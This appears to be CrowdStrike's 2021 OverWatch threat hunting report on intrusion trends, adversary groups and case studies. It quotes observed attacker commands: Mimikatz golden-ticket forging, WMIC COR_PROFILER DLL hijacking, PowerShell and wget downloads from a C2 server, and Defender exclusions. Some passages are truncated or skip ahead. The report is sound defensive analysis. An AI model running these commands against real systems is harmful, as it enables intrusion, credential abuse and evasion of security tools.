2021 Threat Hunting Report

Executive Summary

F

or yet another year, OverWatch disrupted a record number of interactive
intrusion attempts2 by identifying malicious activity early and stopping
adversaries in their tracks. This report shares insights from OverWatch’s
around-the-clock threat hunting from July 1, 2020 through June 30, 2021.3
This year's report starts with a close look at OverWatch's extensive dataset covering
observed interactive threat actor behaviors, which we will refer to in this report as
"intrusion activity". It uses this data to examine how threat actors are operating in
victim environments, highlighting both rare and common techniques that adversaries
are employing.

This report shares
insights into the
latest adversary
tradecraft, gleaned
from OverWatch’s
extensive intrusion
dataset.

The mission of OverWatch is to augment the powerful autonomous protection of the
Falcon platform with human expertise. With the combined power of human ingenuity
and patent-protected work flows, OverWatch systematically sifts through 1 trillion
daily events to find potential hands-on intrusions, on average 1 every 8 minutes.
OverWatch operates with speed and at scale to notify victim organizations of
malicious activity in near real time, ensuring intrusion attempts that incorporate novel
tradecraft are identified and disrupted before the breach.
Key findings from this year’s report include:
	
OverWatch has tracked a 60% increase in interactive intrusion activity in
the past year. The threat of hands-on intrusion activity remains very real —
OverWatch has observed and disrupted intrusions spanning all industry verticals
and geographic regions.
	
Adversaries have moved beyond malware. They are using increasingly
sophisticated and stealthy techniques tailor-made to evade autonomous
detections — of all of the detections indexed by CrowdStrike Threat Graph® in
the past three months, 68% were malware-free.
	
ECrime continues to dominate the threat landscape, making up 75% of
interactive intrusion activity. One driver of this has been the continually evolving
big game hunting (BGH) business model, which has seen the widespread
adoption of both the use of access brokers to facilitate access, and the use of
dedicated leak sites to extract payment.
	
ECrime adversaries are moving with increasing speed in pursuit of their
objectives. OverWatch observations show they are capable of moving laterally
within a victim environment in an average of 1 hour and 32 minutes.
	
Targeted intrusion adversaries remain a prominent threat, particularly for the
telecommunications industry. While organizations of all sizes and in all verticals
have the potential to become a target, the telecommunications industry stood
out this year, accounting for 40% of all state-nexus intrusion activity observed by
OverWatch in the past 12 months.

2 The term “interactive” denotes hands-on adversary activity.
3	The terms “this year” or “this past year” used throughout the report refer to the period from July 1, 2020
to June 30, 2021.

4

2021 Threat Hunting Report

This report features detailed case studies sharing insights into the hands-on activity
that OverWatch tracks on a daily basis and concludes with recommendations for
defenders looking to bolster their security program.
Note that this report’s findings relate to interactive (i.e., hands-on) targeted
intrusions4 and eCrime intrusions that OverWatch tracks and are not necessarily
representative of the full spectrum of attacks that are stopped by OverWatch or the
Falcon platform.
Moreover, the term “intrusion” is used to describe any malicious interactive activity
that OverWatch uncovers in a victim environment. The term “intrusion” is not
synonymous with a “security breach” and should not be understood to mean that
the threat actor was able to achieve their objectives.

4	The term “targeted intrusion” in this report refers to state-nexus or other advanced persistent threat actors.

The Value of Continuous
Threat Hunting

T

he CrowdStrike Falcon platform has proven unequivocally in dozens of
independent tests to be a highly effective solution for protecting endpoints
from modern threats. Still, no technology is 100% effective at blocking
determined intruders.
According to data from our customer base indexed by Threat Graph, 68% of
detections from the last three months were not malware-based. Attackers are
increasingly attempting to accomplish their objectives without writing malware to the
endpoint, using legitimate credentials and built-in tools (living off the land) — which are
deliberate efforts to evade detection by traditional antivirus products.

OverWatch is
on a mission to
find threats that
technology on its
own cannot.

68% of detections

from the last three months
were not malware-based

OverWatch is on a mission to find threats that technology on its own cannot.
Threat hunting takes place at the front lines of the battle between adversaries and
defenders. Each year OverWatch sees more adversaries, new tradecraft and faster
intrusions. In this context, finding the threat is only half the battle; using those insights
to disrupt adversaries at scale is where the battle is won.
In the 12 months from July 1, 2020 to June 30, 2021, OverWatch’s human threat
hunters directly identified more than 65,000 potential intrusions, or approximately
1 potential intrusion every 8 minutes — 24 hours a day, 365 days a year. This
represents thousands of instances where OverWatch analysts uncovered adversaries
actively seeking to evade autonomous detection techniques. When considered
alongside adversaries’ demonstrated ability to begin moving through victim
environments in just minutes — shown throughout this report — these numbers drive
home the criticality of continuous threat hunting.

2021 Threat Hunting Report

Crucially, each of these potential intrusions also represents an opportunity to advance
the autonomous detection techniques in the Falcon platform. With each pass through
the OverWatch SEARCH threat hunting cycle, hunters hone the Falcon platform’s
ability to detect similar intrusions more quickly and autonomously. Over the last
year, threat hunters distilled their findings into the development of hundreds of new
behavioral-based preventions, resulting in the direct prevention of malicious activity
on approximately 248,000 unique endpoints. These behavioral-based preventions
enhance the power of the Falcon platform to uncover novel adversary behavior with
greater speed and scale.
With the right data and tools, a small team of experts can not only stop today's most
sophisticated intrusions but also develop insights that drive continuous advancement
at every level of the security organization.

OverWatch SEARCH Hunting
Methodology

O

verWatch finds threats that technology on its own cannot.

Human-led threat hunting does not replace autonomous detection
technologies — rather, it explicitly sets out to complement and augment
technology-based defenses to ensure that defenders have the power of human
ingenuity on their side.
OverWatch threat hunters employ the “SEARCH” hunting methodology, described
below, to systematically detect threats at scale. Working around the clock,
OverWatch threat hunters methodically sift through a world of unknown unknowns
to find the faintest traces of malicious activity and deliver actionable analysis to
CrowdStrike customers in near real time. The OverWatch SEARCH methodology
shines a light into the darkest corners of customers’ environments — leaving
adversaries with nowhere to hide.

CrowdStrike’s rich telemetry creates the foundation for OverWatch threat hunting.
Upward of 1 trillion events per day, comprising hundreds of event types from
millions of endpoints, are collected and cataloged by the Falcon platform to provide
comprehensive visibility into activity across the CrowdStrike install base.
CrowdStrike's proprietary Threat Graph contextualizes events and reveals relationships
between data points in real time. Threat hunters add a further dimension to the data by
drawing on CrowdStrike’s up-to-the-minute threat intelligence about the tradecraft of
more than 160 adversary groups, as well as by using their intimate working knowledge
of the tactics, techniques and procedures (TTPs) in use in the wild. All of this is
underpinned by OverWatch’s proprietary tools and processes, which ensure every hunt
is optimized for maximum efficiency.
OverWatch analysts use a mix of patent-protected hunting workflows and complex
statistical methods to identify anomalous activity. This is supported by a deep
understanding of adversary behaviors and motivations, enabling the team to form
hypotheses about where adversaries may strike. The breadth and depth of experience
on the OverWatch team is world class, with representation from every corner of public
and private industry. Further, the team is continuously building its knowledge base,
going toe-to-toe with adversaries on the front lines, 24/7/365.
In order to take action against an adversary, it is critical to understand the full nature of
the threat. In just minutes, OverWatch analysts reconstruct threat activity, transforming
it from a collection of data points into a clear story. This information empowers
organizations to not only remediate but also plug the gaps in their environment.
Time is of the essence in preventing an intrusion from becoming a breach. OverWatch
operates as a native component of the Falcon platform. Through Falcon, OverWatch
delivers clear, accurate and actionable information on potentially malicious activity in
near real time, enabling organizations to respond quickly and decisively, without friction.
With each new threat, OverWatch extracts new insights to drive continuous
advancements in automated detections and human threat hunting. The team is
consistently fine-tuning its skills and processes to always stay a step ahead of the
adversary.

2021 Threat Hunting Report

Intrusion Campaigns Summary
Intrusion Campaign Numbers
Over the past year, OverWatch tracked steadily increasing numbers of interactive
intrusion campaigns. Year over year, OverWatch observed a near 60% increase in the
number of campaigns. In the most recent quarter, from April to June 2021, OverWatch
uncovered more intrusion campaigns than in any other quarter.

Adversary Motives
For yet another year, financially motivated eCrime activity dominated the interactive
intrusion attempts tracked by OverWatch. ECrime accounted for 75% of the interactive
intrusion activity, while targeted intrusions accounted for 24% and the remaining 1%
was attributed to hacktivist activity.

eCrime

Financially motivated criminal intrusion activity

Targeted

State-sponsored intrusion activity that includes cyber espionage, state-nexus
destruction attacks and currency generation to support a regime

Hacktivist

Intrusion activity undertaken to gain momentum, visibility or publicity for a
cause or ideology

These figures track closely with the distribution of activity seen in the previous year.
Seeing these figures stabilize indicates that the distribution of eCrime and targeted
intrusion activity may be reaching an equilibrium after several years of eCrime activity
rapidly expanding relative to targeted intrusions.

Year over year, OverWatch observed a near 60%
increase in the number of interactive intrusion
campaigns.

July 1, 2020
to June 30, 2021 where
(Vietnam)
breakout time could be derived, the average was just 1 hour 32 minutes. Moreover, the
OverWatch team found that in 36% of those intrusions, the adversary was able to move
laterally to additional hosts in less than 30 minutes.
ECrime adversaries also continue to innovate and evolve their business models to
increase their chance of success. The majority of ransomware operators engaged in
big game hunting (BGH) activity have now adopted the threat of data leaks alongside
data encryption as a means to extract payment from victims. Many adversaries have
also established dedicated leak sites (DLSs) as a forum to publicize victim details and
release the stolen data. INDRIK SPIDER is an exception to this trend toward the use of
data extortion.
Another feature of the eCrime threat landscape in the past 12 months is the growing
importance of access brokers who play a role in facilitating access for other eCrime
actors to stage their intrusions. The feature story In Pursuit of PROPHET in this report
takes a look at access brokers in action.

11

2021 Threat Hunting Report

OverWatch also recorded a 100% increase in instances of cryptojacking in interactive
intrusions year over year. This was likely driven by steep increases in cryptocurrency
values beginning in late 2020.
The potential for growth in eCrime activity is almost limitless, propelled by new actors,
new vulnerabilities or failures on the part of organizations to maintain basic security
hygiene. While OverWatch indeed saw an increase in the number of eCrime intrusion
attempts over the past 12 months, this growth did not outpace the growth in targeted
intrusion activity to the degree seen in previous years.
One factor that may have stemmed the rapid acceleration of eCrime activity
is successful interventions by law enforcement against adversary-controlled
infrastructure and resources. These efforts touched the operations of several
prominent eCrime groups including WIZARD SPIDER, MUMMY SPIDER, CIRCUS
SPIDER, GRACEFUL SPIDER, TWISTED SPIDER and CARBON SPIDER. Law
enforcement activity, however, appears to only temporarily disrupt eCrime activity,
rather than halting operations altogether. Adversaries have shown resilience by quickly
activating new C2 infrastructure and diversifying their toolsets.

Targeted Intrusion
Generally, adversary groups from the People’s Republic of China, the Democratic
People’s Republic of Korea (DPRK, aka North Korea) and the Islamic Republic of
Iran are the source of the majority of targeted intrusion5 activity OverWatch tracks.
However, in the past year, OverWatch also tracked an uptick in suspected state-nexus
activity not attributed to named actor groups.

Again, the term “targeted intrusion” in this report refers to state-nexus or other advanced persistent
threat actors.

12

2021 Threat Hunting Report

In the year leading up to June 30, 2021, Chinese state-nexus adversaries (aka PANDAs)
maintained a high operational tempo and conducted sustained and wide-ranging
campaigns motivated both by intellectual property (IP) theft and intelligence gathering
objectives. PANDAs were among the targeted intrusion adversaries most commonly
uncovered by OverWatch threat hunters during this period.
A notable development in early 2021 was the mass exploitation of Microsoft Exchange
Server vulnerabilities by suspected China-nexus adversaries. This serves as a reminder
of the diverse skill sets of China-nexus actors and highlights the ever-present threat of
new vulnerabilities being found and exploited. A story later in this report — OverWatch
Disrupts Microsoft Exchange Zero-Day Exploits with Falcon Complete — examines
how CrowdStrike’s managed services worked together to disrupt and expel an as-yetunnamed threat.
OverWatch tracked relatively consistent levels of activity attributed to North Korea
(CHOLLIMAs). CrowdStrike Intelligence reports that North Korean actors — including
two actors tracked by OverWatch in the past 12 months, LABYRINTH CHOLLIMA and
SILENT CHOLLIMA — continue to make iterative updates and improvements to their
toolsets. An intrusion story later in this report — Custom Tooling Rings Alarm Bells in
Intrusion by (Not So) SILENT CHOLLIMA — sheds light on how some of this custom
tooling has been used in the wild.
In contrast to the observed China-nexus and DPRK adversary activity, OverWatch saw
a downturn in activity stemming from Iran (KITTENs). CrowdStrike Intelligence reports
that in 2020, many of Iran’s observed intrusion efforts focused on targets related
to narrower geopolitical and domestic concerns; this may have contributed to the
reduction in campaigns seen by OverWatch.
OverWatch also uncovered a number of intrusion campaigns with all of the hallmarks
of state-nexus activity, but that cannot at this time be attributed to any of the named
adversary groups tracked by CrowdStrike Intelligence. Much of this activity targeted
the telecommunications industry, explored in detail in the Signal Interference feature
later in this report. This increase in activity attributable to diverse and globally
dispersed mission clusters underscores the variety of targeted intrusion threats that
exist in the current threat landscape.

Hacktivism
Hacktivism accounted for only a small fraction of the interactive activity tracked by
OverWatch. All hacktivist activity seen by OverWatch has been attributed to a single
adversary group — FRONTLINE JACKAL, an Iranian nationalist hacktivist group known
to deface websites and carry out other disruptive online activity targeting U.S., Israeli
and Saudi Arabian organizations. Adversary activity observed by OverWatch provided
CrowdStrike Intelligence with additional visibility into this group’s operating procedures.

Intrusions by Industry Vertical
Figure 3 shows the top 10 industry verticals that featured most frequently in the
interactive intrusion activity uncovered by OverWatch from July 2020 to June 2021.
The same 10 industries also made up the top 10 list for the 12-month period from July
2019 to June 2020. Notably, the technology industry has now held the top spot for the
past three years.

Figure 4. Comparison of the industry verticals most frequently impacted by targeted intrusion vs.
eCrime threat actors. July 2020 to June 2021

The telecommunications industry notably accounted for 40% of all targeted intrusion
activity uncovered by OverWatch in the 12 months to June 30, 2021, explored in detail
in the Signal Interference feature later in this report. Other notable inclusions in the
targeted intrusion “Top 5” are the healthcare and academic industries, which fell victim
to ongoing targeting over the reporting period, particularly due to their involvement in
COVID-19 related research.6
ECrime intrusions, in contrast, were more evenly distributed across industry verticals.
This is indicative of the opportunistic nature of much of eCrime activity, which leads to
a much wider spread of activity across diverse industry verticals.

2021 Threat Hunting Report

Adversary Activity
In the year to June 30, 2021, OverWatch uncovered interactive intrusion activity
conducted by 30 distinct named threat actor groups. In addition, threat hunters
uncovered an extensive array of activity suspected of being eCrime or targeted
intrusion activity, but not specifically tied to a named group.
Figure 5 provides a breakdown of the adversaries observed by OverWatch. ECrime
activity was by far the most widespread across industry verticals, followed by intrusions
conducted by PANDA adversaries.
OverWatch uncovered activity by 13 named eCrime (aka SPIDER) adversary groups.
Of these groups, WIZARD SPIDER7 was the most prolific, with nearly twice as many
intrusion attempts than any other eCrime group observed by OverWatch. WIZARD
SPIDER deployed the Cobalt Strike Beacon in more than half of these intrusions; other
commonly seen tools included Ryuk ransomware, the Windows backdoor access tool
BazarLoader and the Active Directory discovery tool AdFind.
For targeted intrusion activity, intrusions attributed to People’s Republic of China (aka
PANDA) actors were the most common. OverWatch uncovered intrusion attempts
by eight separate named China-nexus adversaries, with WICKED PANDA8 being the
most active. WICKED PANDA also frequently deployed Cobalt Strike using bespoke
loaders such as AttachLoader while also deploying the custom Winnti, ShadowPad and
RouterGod backdoors.
A few things to note about the data presented in Figure 5:
	
The heat mapping represents the number of distinct actors active within a particular
vertical.
	
The heat mapping does not represent the total number of intrusion attempts within a
vertical, as multiple intrusions by the same adversary group are only represented once.
	
Attribution to a high degree of confidence is not always possible. This table does
not reflect any unattributed activity that occurred in any of the industry verticals.
	
Verticals not listed in this chart indicate that OverWatch did not record any
intrusions attributable to a specific actor group during this period.

Adversary Technique and
Tooling Insights

O

verWatch is a sophisticated threat hunting team that finds and disrupts
adversary activity on a global scale. OverWatch carefully documents the
details of each intrusion it uncovers, building a rich data set of adversary
activity. With each new intrusion, threat hunters create a sharper picture of the
threat landscape and the tradecraft of the adversaries that inhabit it.
This data-driven analysis of adversary tradecraft seeks to better equip defenders to
take a proactive and evidence-informed approach to protecting their environment.
The analysis below draws on OverWatch’s rich repository of intrusion data collected
over the past year. It begins with a visualization of interactive intrusion activity observed
by OverWatch threat hunters in a MITRE ATT&CK® heat map. It then details the
techniques and tools encountered most often by OverWatch, thereby indicating where
defenders can potentially achieve the greatest return on hunting efforts. It goes on to
examine outliers in the data, highlighting the more novel and sophisticated techniques
OverWatch uncovered.

MITRE ATT&CK Heat Map
OverWatch tracks interactive intrusion activity against the MITRE ATT&CK Enterprise
Matrix. The following heat map illustrates the prevalence of adversary tactics,
techniques and sub-techniques observed by OverWatch threat hunters from
Jan. 1, 2021 to June 30, 2021.9 This heat map represents activity seen in interactive
intrusions only, and does not reflect the breadth of activity seen and stopped by the
Falcon platform. This table excludes any techniques or sub-techniques not observed
by OverWatch in this reporting period.

While the rest of this report covers a 12-month period, the heat map only includes data from Jan. 1, 2021,
when OverWatch began tracking against the latest MITRE ATT&CK matrix, which, among other changes,
introduced sub-techniques.

intrusion attempts from Jan. 1 to June 30, 2021

2021 Threat Hunting Report

Techniques and Tools: A Closer Look
There are no surprises among the most commonly observed techniques. In fact, the
heat map in Figure 6 clearly illustrates that tried-and-true techniques serve as the
foundation for a significant proportion of the malicious interactive activity OverWatch
observes. The heat map thus serves as a guide to defenders, highlighting which
focus areas they should prioritize for the best return on their investment of time and
resources.
As an example, building up hunting capabilities across discovery techniques can yield
significant dividends. As a threat actor establishes a foothold, they commonly begin
the discovery process to better understand the victim organization’s domain, user
accounts and system configurations. This is usually true regardless of the threat actor’s
ultimate intent. Discovery is a vital step to plan their next move, be it lateral movement,
collection or exfiltration.
Because many discovery activities fall well within what is “normal” administrative
behavior in an enterprise environment, it is crucial that any hunting leads are
augmented by tooling and human expertise that will filter out likely false positives.
Hunters should prioritize the results from their hunting leads by focusing on
instances where multiple different discovery hunting leads trigger within a short
period of time. A sudden “burst” of discovery actions may stand in contrast to
administrators or normal users, and often reflects an adversary quickly trying to
orient themselves in a network.
Ingress Tool Transfer is another of the techniques most commonly observed by
OverWatch. It is therefore beneficial for defenders and hunters to know which tools are
most often used by threat actors. Table 1 shows the list of tools common across both
targeted intrusion and eCrime actors, as well as the top tools used exclusively by each
group.

Expect the Unexpected: Five Uncommon Techniques
That Underscore the Need for Comprehensive Hunting
Capabilities
The analysis to this point has examined the techniques that are most prominent
in the OverWatch data. Threat hunting really comes into its own, however, when
defending against the less-prevalent techniques that adversaries employ as part of
their operations.
The analysis that follows examines some of the rare and notable techniques that
OverWatch threat hunters uncovered among the activity observed over the past year.

Use Alternate Authentication Material: Pass the Ticket10

T1550.003

Once an attacker has gained access to a domain controller, they can dump the SID
and NTLM hash of a domain user with ticket granting privileges to create their own
Kerberos tickets for valid use across the domain.
Unidentified PANDA
What OverWatch Observed
A persistent threat actor used Mimikatz to create a Golden Ticket using harvested
credentials from the domain controller and immediately injected the newly created
ticket into their session for use. Mimikatz continues to show up in many of the intrusion
attempts OverWatch identifies, as its versatility for both dumping and leveraging
credentials makes it a straightforward and effective tool for adversaries to employ.
kerberos::golden /domain:[REDACTED] /sid:[REDACTED]
/rc4:[REDACTED] /user:krb /ptt
For this attack to be successful, a threat actor must have already gained privileged
access to a domain controller on the network. Using this technique allows them
to create tickets for nonexistent accounts, thereby obfuscating their access and
potentially maintaining a foothold in the network.

10 https://attack.mitre.org/techniques/T1550/003/

24

2021 Threat Hunting Report

Hijack Execution Flow: COR_PROFILER11

T1574.012

Threat actors can modify the COR_PROFILER environment variable to load a
malicious DLL into a .NET process that relies on the Common Language Runtime.
Unidentified SPIDER

What OverWatch Observed
A suspected eCrime adversary exploited a web service on a Windows server and
downloaded a number of tools. They then used WMIC to create and modify the
COR_PROFILER and COR_ENABLE_PROFILING environment variables to load one
of the downloaded malicious DLLs.
wmic ENVIRONMENT create
name="COR_ENABLE_PROFILING",username="[REDACTED]",VariableValue="1"
wmic ENVIRONMENT create
name="COR_PROFILER",username="[REDACTED]",VariableValue="[REDACTED]”
This technique not only provides persistence, but if the .NET process that triggers
it runs at a higher privilege, the attacker DLL will run at that privilege. Whether an
attacker gained access to a system with valid account credentials or via an exploited
service, this technique may provide privilege escalation without requiring further
credential harvesting.

Compromise Client Software Binary12

T1554

Upon gaining access to a network, adversaries can modify client software binaries
for persistence. Client software that can be compromised and used for this purpose
include SSH, FTP, email clients and web browsers.
State-sponsored
(Suspected)

What OverWatch Observed
A suspected state-nexus adversary had compromised an environment prior to the
victim deploying Falcon. Once OverWatch established visibility, it became clear
that the adversary was well entrenched. Threat hunters observed the adversary
accessing a Linux host via SSH using valid credentials. The adversary then used a
renamed tcsh Unix shell with the setuid bit set to elevate privileges and installed an
alternative SSH server/client, which was a modified version of SSH. The software
had been altered to provide the capability of covertly logging credentials.
While it is more common for adversaries to use existing tools or native utilities to
achieve their objectives, in some cases modified software may prove to be the best
way for an adversary to achieve their goal. It is important for defenders to monitor
software to ensure that signatures remain valid. It is also important to be alert to
unusual behavior stemming from client applications.

2021 Threat Hunting Report

Cloud Service Discovery13

BEAR (Suspected)

T1526

After gaining initial access to a network, an adversary may attempt to perform
reconnaissance on cloud services running on a host or enabled in the environment.
This can take several of different forms due to the range of services across various
cloud providers.
What OverWatch Observed
Over the past year, OverWatch observed an increase in discovery actions focused
specifically on cloud services. For example, OverWatch identified a suspected
Russian state-nexus adversary exploiting a Windows host via spearphishing. When
the adversary accessed the system, they initially performed basic reconnaissance. In
doing so, they recognized the device was joined to Azure Active Directory. To perform
additional discovery on this Azure cloud-based service, they executed the
dsregcmd /status command, which provides several details related to the join
status of the host.14 While this may seem relatively straightforward, hunting for this type
of behavior can be a valuable hunting lead for networks integrated with cloud services.
OverWatch has been seeing an increase in cloud service discovery activities due
to rapid adoption of cloud services, warranting increased attention from defenders.
As noted, discovery activities are often a foundational stage in hands-on intrusions.
Defenders should be particularly vigilant in investigating any discovery activity that
falls outside of what is generally expected in their environment.

Supply Chain Compromise15

State-sponsored
(Suspected)

T1195

Adversaries are known to target specific organizations, not as an end goal but as a
way to gain access to organizations in that victim’s supply chain. This can take the
shape of maliciously modifying a product prior to its delivery to a final user, inserting a
backdoor or compromising the software to facilitate later delivery of malware.
What OverWatch Observed
Following the deployment of Falcon in a technology company’s environment, OverWatch
hunters uncovered evidence of a deeply embedded hands-on intrusion. Hunters tracked
the activity and found that the adversary was using compromised credentials to access
an internal code sharing repository. The source code within the repository was used for
a legitimate software product that the victim delivered to its customers. The adversary
used this compromised account to perform discovery and file interaction related to
this repository, providing them the potential opportunity to maliciously manipulate the
software before delivery to end users. In this case, the organization’s deployment of
Falcon along with OverWatch proactive threat hunting, proved timely in disrupting an
ongoing active intrusion and preventing follow on actions on objectives.
As demonstrated in many high-profile cases, supply chain compromises can have
widespread implications. In this case, the consumers of this compromised software
product could have been vulnerable to exploitation had OverWatch hunting not identified
the adversary’s subtle attempts to leverage valid accounts for accessing source code.

In Pursuit of PROPHET
INTRUSION
ACTIVITY
IN-DEPTH
The stories and analysis
that follow provide a window
into the interactive intrusion
activity that OverWatch
uncovers daily. This cross
section of eCrime and
targeted intrusion activity has
been selected to provide a
closer look at how some of
the intrusion trends from the
past year have played out in
the wild.

F

rom developers to money mules, it takes multiple criminal actors fulfilling a wide
range of functions to facilitate a successful ransomware attack. Over the past
year, access brokers carved out a unique role in today’s multifaceted eCrime
ecosystem. One prolific suspected access broker over the past year is an adversary
tracked by CrowdStrike Intelligence as PROPHET SPIDER.
Access brokers specialize in breaching networks with the intention of selling that
access to others. Their customers use the access to launch their own campaigns,
which increasingly involve the deployment of ransomware. Threat hunters can cut short
this eCrime supply chain by finding and disrupting access brokers as they attempt to
gain a foothold in a network.
PROPHET SPIDER has earned a reputation for gaining initial access by compromising
vulnerable web servers. This eCrime adversary typically targets Oracle WebLogic
servers and has been observed exploiting CVE-2016-0545, CVE-2020-14882 and
CVE-2020-14750, but CrowdStrike has also observed this actor targeting other
web servers. To enable persistence, PROPHET SPIDER often deploys a variety of
backdoors and reverse shell tools, such as GOTROJ, that connect to hard-coded
command and control (C2) IP addresses. Securing redundant access to these
compromised networks is likely an attempt by access brokers to increase the value of
the product they are selling.
OverWatch threat hunters uncovered multiple attempted PROPHET SPIDER intrusions
spanning several industry verticals. One particular intrusion against a technology
company featured many typical PROPHET SPIDER tactics and techniques. By
understanding these behaviors, defenders can better equip themselves with the
knowledge needed to rapidly disrupt access brokers before they can use any access
for malicious intent.

An Unwelcome PROPHET
OverWatch recently uncovered evidence of a Windows-based WebLogic server
compromise on a technology company’s network. Threat hunters were alerted to a
potential unwanted intruder when a discovery command, in this case whoami, was
seen running under a java.exe process (shown in the image below). Adversaries
commonly run discovery commands early in an intrusion as they attempt to get their
bearings in a new environment.

OverWatch notified the customer and continued tracking the adversary as they
proceeded to explore the environment for clues to help them deepen their foothold.
The adversary attempted discovery of system network configuration,16 files and
directories,17 running processes18 and domain trusts.19 They then proceeded to
retrieve and install tools to help them establish persistence and expand their foothold.
OverWatch updated the victim organization about the malicious behavior as it
unfolded, equipping the organization's team with the details necessary to prevent
PROPHET SPIDER from handing off access to another adversary that would likely
have deployed ransomware.

2021 Threat Hunting Report

FEATURED TECHNIQUE:
INGRESS TOOL TRANSFER20
How this technique works: After gaining initial access into a compromised
environment, adversaries may attempt to retrieve and install tools from an external
system. Transfer of files from external C2 servers can occur over FTP, web or
various other protocols.
Why attackers use it: Sometimes adversaries cannot rely solely on native tooling
to expand their foothold or complete their intrusion. It may be necessary (or simply
more convenient) to access additional tools. While adversaries may use this technique
to install malware, it is not uncommon to observe them transferring otherwise
legitimate tools into a victim environment. Transferring legitimate utilities can expand
an adversary’s tool set without necessarily triggering security software detection.
Further, tool transfers may go undetected in cases where defenders don’t routinely
and continuously monitor for unexpected file transfers, uncommon data flows or
unusual external network connections that result in file creation.
What threat hunting delivers: Threat hunting is crucial for ensuring that adversaries
are unable to transfer files into a victim network unnoticed. In this intrusion attempt,
PROPHET SPIDER first used PowerShell to retrieve a copy of a Windows version of
the wget utility. Then, using wget, they downloaded a web shell and a low-prevalence
scanning tool. OverWatch threat hunters caught this activity by proactively hunting
for unexpected processes retrieving files from external servers. OverWatch routinely
pays close attention to the presence of legitimate tools that eCrime adversaries are
known to use.

Why Windows When You Can Linux?
The behavior that OverWatch observed next revealed PROPHET SPIDER’s style and
preferences. The adversary executed the following PowerShell command to retrieve
and install a binary file:
powershell -Command (New-Object
System.Net.WebClient).DownloadFile(:443/wget.bin',
'C:\Windows\temp\wget.bin')
Further analysis confirmed that this file from their external C2 server was a
legitimate PE file version of the wget utility for use on Windows. This is a common
approach OverWatch has observed PROPHET SPIDER take when operating in
Windows environments. Typically, the servers they compromise for initial access
are Linux-based, so a repeated use of wget on Windows machines suggests their
preference and comfort using traditional Linux tooling when possible.

20

https://attack.mitre.org/techniques/T1105/

29

2021 Threat Hunting Report

After installing wget.bin, the adversary immediately used it for additional ingress
tool transfer. They proceeded to install a copy of 7zip:
c:\windows\temp\7fde\wget.bin -t 1
c:\windows\temp\7fde\7z.bin

:443/7z.bin -O

They also used wget to retrieve a web shell with a file name of pia.jsp. Another tool
they installed was their scanner of choice, a simple low-prevalence network scanning
tool often named pscan. The tool scans a range of IP addresses for one specific port.
CrowdStrike has observed it in both PE and ELF versions, which is consistent with
PROPHET SPIDER’s focus on targeting both Linux and Windows servers. In this case,
they used pscan to scan the network for openings on port 445 (SMB), likely in hopes
of moving laterally.

Conclusion and Recommendations
Thanks to OverWatch threat hunters’ rapid discovery of the activity, the customer
received the necessary information to cut off the adversary’s access, preventing
PROPHET SPIDER from using this network as its next resale opportunity for
ransomware operators.
Interestingly, the adversary returned one month later to the same server and attempted
to perform similar TTPs. Such perseverance illustrates the determination of eCrime
adversaries as they continue to mature and specialize in various functions of the eCrime
ecosystem. It is an unfortunate fact that intrusions are rarely a one-off event.21
The best defense against opportunistic attacks by access brokers is to ensure your
externally facing servers are fully patched. However, preventative measures are not
a silver bullet. Adversaries may be able to bypass even robust and secure perimeters
using a variety of techniques. Therefore, proactive threat hunting like what
OverWatch provides is also essential. When threat hunters are effectively scouring
your network for even the most subtle clues of a potential adversary presence, they
can quickly home in on unusual behaviors, such as the living-off-the-land discovery
actions that PROPHET SPIDER used early in this intrusion.
In addition to hunting for unexpected reconnaissance, defenders should also monitor
their environment for potentially malicious ingress tool transfer. To do this effectively,
defenders must continually monitor for unexpected processes retrieving files from
external servers as well as uncommon network data flows. Defenders should also hunt
for legitimate tools that eCrime adversaries like to use. Antivirus products typically
will not block these tools because of their common and legitimate usage, but they can
serve as a valuable lead in revealing an unwelcome user on your network.

21 Of those organizations that engaged CrowdStrike incident response services and went on to engage
Falcon Complete™ managed detection and response (MDR), 68% were targeted within the following 12
months by another sophisticated intrusion attempt, which was thwarted by Falcon Complete. For more information, see the 2020 CrowdStrike Services Cyber Front Lines Report.

Gh.exe is a self-extracting RAR archive (SFX) that writes three binaries to disk:
•

C:\Intel\Drv\Microsoft0leSystemmcas.exe

•

C:\Intel\Drv\winlog0nUser.exe

•

C:\Temp\Cabs\sndcab.exe

The SFX runs a batch script named new.bat, which establishes persistence for these
binaries by scheduling individual tasks to execute each binary at system startup. Each
created task uses a name that masquerades24 as an update service:
•

MicrosoftWindowsUpdateTool

•

MicrosoftUptadeTool (sic)

•

MicrosoftWindowsEdgeUpdateTool

Additionally, new.bat attempts to establish persistence by adding entries to the
HKCU\Software\Microsoft\Windows\CurrentVersion\Run key for each binary,
and uses the attrib command to set the +h (hidden) and +s (system) properties for
C:\Intel\Drv and C:\Temp\Cabs.
v.bat uses PowerShell’s Set-MpPreference command to add exclusions to
Windows Defender for C:\Temp and C:\Intel to attempt to prevent Defender from
scanning directories containing Prilex binaries.

FEATURED TECHNIQUE:
PHISHING/SPEARPHISHING VIA SERVICE (E.G., “VISHING”) 25
How this technique works: An adversary intent on targeting a specific victim may
seek the cooperation of valid users through deception and social engineering
delivered outside enterprise email channels. By researching the target in advance,
the adversary may learn which communication methods are available or likely to
succeed, and organization-specific details that can be useful in crafting a convincing
message. When adversaries employ spoken communications, these voice phishing
attempts are referred to as “vishing.”
Why attackers use it: Enterprise security solutions have rightly focused on the email
phishing threat, increasing the difficulty of successful compromise. Adversaries
may bypass these hurdles by avoiding enterprise email altogether and attempting
to manipulate users through other communication channels that are less frequently
monitored, if at all.
What threat hunting delivers: Because these phishing attempts avoid the process
provenance of enterprise email applications, automated detections focused solely
on that point of origin are insufficient. Initial access may begin with a valid user
intentionally downloading and executing a legitimate application, as was the case in
the SPIDER vishing attack described above. Effective threat hunting looks for valid
accounts carrying out successive phases of an intrusion, such as C2, persistence
and lateral movement.

Following the Footprints for Detection and Response
There are numerous techniques adversaries can use to compromise valid accounts
and leverage them for malicious use. Some techniques, such as spearphishing
attachments26 and password spraying,27 create predictable telemetry patterns that
are relatively easy to identify. Others, such as user execution of remote access tools
or divulging of credentials through a fake login portal, are harder to detect. While
user education is an essential part of countering this threat, defenders must be able
to detect the inevitable compromises and the intrusions that follow.
For an adversary, gaining execution in the target environment is only a first step
toward their objective. As the adversary continues to advance, each step becomes
an opportunity for threat hunters to identify the telltale footprints of an intruder.
In this intrusion, threat hunters found their first clue when the adversary wrote both
low-prevalence and known suspicious tools to the host. By using CrowdStrike Threat
Graph to correlate the same indicators from the same account across multiple
hosts, a picture of potential lateral movement began to take shape.
At this stage, however, the adversary’s first footprints might be explained away as a
system administrator using remote access software to deploy internally developed
software (which would explain the novel hash signatures).
